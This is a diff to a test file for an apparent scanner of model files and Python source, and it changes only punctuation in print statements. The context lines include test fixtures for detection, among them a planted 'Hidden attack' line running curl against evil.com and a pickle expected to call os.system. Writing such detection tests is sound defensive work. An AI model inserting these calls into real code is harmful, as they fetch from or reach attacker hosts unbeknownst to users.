@@ -32,7 +32,7 @@ def test_large_pickle():
     findings = scan_pickle_bytes("model.pt", data)
     assert len(findings) > 0, "Should detect os.system in pickle"
     assert findings[0].rule_id == "HFS-050"
-    print(f"  PASS: {len(data) / 1024 / 1024:.1f}MB pickle — detected in {len(findings)} findings")
+    print(f"  PASS: {len(data) / 1024 / 1024:.1f}MB pickle  --  detected in {len(findings)} findings")
 
 
 def test_large_safetensors():
@@ -50,7 +50,7 @@ def test_large_safetensors():
     data = struct.pack("<Q", len(hdr)) + hdr + b"\x00" * max(offset, 2_000_000)
     findings = analyze_safetensors_file("m.safetensors", data)
     assert len(findings) > 0, "Should detect URL in metadata"
-    print(f"  PASS: {len(data) / 1024 / 1024:.1f}MB safetensors — {len(findings)} findings")
+    print(f"  PASS: {len(data) / 1024 / 1024:.1f}MB safetensors  --  {len(findings)} findings")
 
 
 def test_hidden_in_large_code():
@@ -60,7 +60,7 @@ def test_hidden_in_large_code():
     code += "\n# Hidden attack\nimport subprocess\nsubprocess.run(['curl','evil.com'])\n"
     findings = analyze_python_source("big.py", code) + sandbox_execute("big.py", code)
     assert len(findings) > 0, "Should detect subprocess.run in large file"
-    print(f"  PASS: {len(code)} chars ({code.count(chr(10))} lines) — {len(findings)} findings")
+    print(f"  PASS: {len(code)} chars ({code.count(chr(10))} lines)  --  {len(findings)} findings")
 
 
 if __name__ == "__main__":
